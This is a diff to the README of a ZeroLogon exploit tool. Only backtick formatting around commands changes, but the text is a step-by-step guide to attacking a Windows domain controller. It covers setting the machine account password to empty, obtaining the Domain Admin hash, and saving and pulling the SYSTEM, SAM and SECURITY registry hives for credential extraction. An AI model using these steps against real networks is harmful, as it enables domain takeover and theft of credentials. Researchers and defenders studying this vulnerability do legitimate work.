@@ -4,19 +4,19 @@ Exploit code based on https://www.secura.com/blog/zero-logon and https://github.
 
 To exploit, clear out any previous Impacket installs you have and install Impacket from https://github.com/SecureAuthCorp/impacket/commit/b867b21 or newer.
 
-`apt update
+`apt update`
 
-apt remove --purge impacket-scripts python3-impacket 
-apt autoremove
+`apt remove --purge impacket-scripts python3-impacket `
+`apt autoremove`
 
-git clone https://github.com/rthalley/dnspython.git
-sudo python3 setup.py install
-cd ..
-git clone https://github.com/SecureAuthCorp/impacket.git
-cd impacket
-sudo python3 setup.py install
-git clone 
-`
+`git clone https://github.com/rthalley/dnspython.git`
+`sudo python3 setup.py install`
+`cd ..`
+`git clone https://github.com/SecureAuthCorp/impacket.git`
+`cd impacket`
+`sudo python3 setup.py install`
+`git clone `
+
 Then, do:
 
 `python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR`
@@ -32,17 +32,17 @@ which should get you Domain Admin hash. After you have that, wmiexec.py to the t
 
 and do
 
-`reg save HKLM\SYSTEM system.save
-get system.save
-del /f system.save
+`reg save HKLM\SYSTEM system.save`
+`get system.save`
+`del /f system.save`
 
 
-reg save HKLM\SAM sam.save
-get sam.save
-del /f sam.save
+`reg save HKLM\SAM sam.save`
+`get sam.save`
+`del /f sam.save`
 
 
-reg save HKLM\SECURITY security.save
+`reg save HKLM\SECURITY security.save
 get security.save
 del /f security.save`
 
@@ -62,7 +62,7 @@ Then you can run
 
 And that should show you the original NT hash of the machine account. You can then re-install that original machine account hash to the domain by
 
-python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
+`python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH`
 
 Reinstalling the original hash is necessary for the DC to continue operating normally.
 
